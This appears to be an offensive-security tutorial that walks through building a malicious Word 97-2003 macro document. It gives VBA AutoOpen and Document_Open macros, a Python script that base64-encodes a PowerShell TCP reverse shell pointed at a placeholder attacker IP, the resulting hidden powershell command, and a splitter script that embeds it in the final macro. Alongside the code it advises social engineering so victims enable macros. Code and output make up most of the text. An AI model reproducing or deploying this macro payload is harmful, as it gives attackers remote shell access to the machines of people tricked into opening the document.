# Preparing the Attack

Older code but it still check out.

When we deliver the Office document the file is tagged with the `Mark of the Web (MOTW)` which when opened are opened in `Protected View` which disables all editing and modification settings in the document and blocks the execution of macros or embedded objects.

If the victim clicks `Enable Editing` the Protected View is disabled.

Ideally social engineering to get the user to click Enable Editing is needed.

By Default Microsoft now (2025) blocks macros by default.

They now no longer receive an `Security Warning Macros have been disabled. Enable Content` message and button.

Now they receive `Security Risk - Microsoft has blocked macros from running because the source of this file is untrusted... Learn More`

If we convince the user to unblock the file via the checkbox before our malicious macro can be executed.

# Creating a Macro based Word Document

Create a new blank Word document and `Save As` to be a file of type `Word 97-2003 Document`.

After saving the dopcument... go to the `View` Menu and click on `Macros` button - you are presented with the `Macros dialog box`.

Change the `Macros in` from `Normal.dotm (global template)` to `<filename>(document)`

Create a name for the Macro, say `MyMacro` and then click the `Create` button.

Next you have the Macro Editor window and the following start template for your macro:

```
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

Lets upgrade this to include an `AutoOpen()` and a `Document_Open()` subroutines.

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

NB: VBA has a 255-character limit for literal strings but doesn't apply to variables so we can split the commands into different strings and concatenate them.

Here is a python script to convert a `PowerShell TCP One Line Reverse Shell` into a powershell encoded string that can be submitted to `powershell -enc <encoded string goes here>`


encode.py

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

This produces the following encoded command `(NB not using an actual ip so is benign)`

```
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAPABhAHQAdABhAGMAawBlAHIALQBpAHAAPgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Next we run this other python script to split it so the whole encoded command gets split into multiple strings for the office macro

stringsplitter.py

```
str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAPABhAHQAdABhAGMAawBlAHIALQBpAHAAPgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

This produces the following into the macro...

```

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA"
    Str = Str + "D0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0"
    Str = Str + "ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa"
    Str = Str + "QBlAG4AdAAoACIAPABhAHQAdABhAGMAawBlAHIALQBpAHAAPgA"
    Str = Str + "iACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjA"
    Str = Str + "GwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFs"
    Str = Str + "AYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4AL"
    Str = Str + "gA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAA"
    Str = Str + "kAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkA"
    Str = Str + "GIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGU"
    Str = Str + "AbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAd"
    Str = Str + "ABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB"
    Str = Str + "5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0A"
    Str = Str + "C4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQ"
    Str = Str + "AUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAa"
    Str = Str + "QApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAA"
    Str = Str + "gACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTA"
    Str = Str + "HQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACA"
    Str = Str + "APQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAI"
    Str = Str + "gAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgA"
    Str = Str + "gACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlA"
    Str = Str + "HgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEk"
    Str = Str + "AKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAY"
    Str = Str + "wBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAA"
    Str = Str + "kAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5A"
    Str = Str + "HQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4"
    Str = Str + "ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAb"
    Str = Str + "ABvAHMAZQAoACkA"

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Then when the victim opens the office document and clicks enable macros, you get a reverse shell...

